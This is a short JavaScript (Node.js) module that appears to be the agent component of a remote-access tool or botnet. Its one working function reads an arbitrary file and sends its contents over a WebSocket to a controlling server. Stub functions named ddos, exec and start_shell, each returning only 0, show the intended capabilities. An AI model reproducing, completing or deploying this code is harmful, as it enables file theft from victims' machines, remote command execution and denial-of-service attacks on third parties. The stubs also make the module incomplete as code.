const fs = require('fs');

function send_file_to_sv(id, name, filepath, webSocket, hash){
    // Open file

    try {
        const data = fs.readFileSync(filepath, 'utf-8');
        // TODO optional hash for integrity check
        const result = {
            id,
            type: "Download",
            name: name,
            hash: 0,
            data: data
        };
        webSocket.send(JSON.stringify(result));
    } catch (err) {
        console.error("Error reading file:", err)
    }

}

function ddos(id, url, port){
    return 0;
}

function exec(id){
    return 0;
}

function start_shell(id){
    return 0;
}

module.exports = { send_file_to_sv, ddos, exec, start_shell }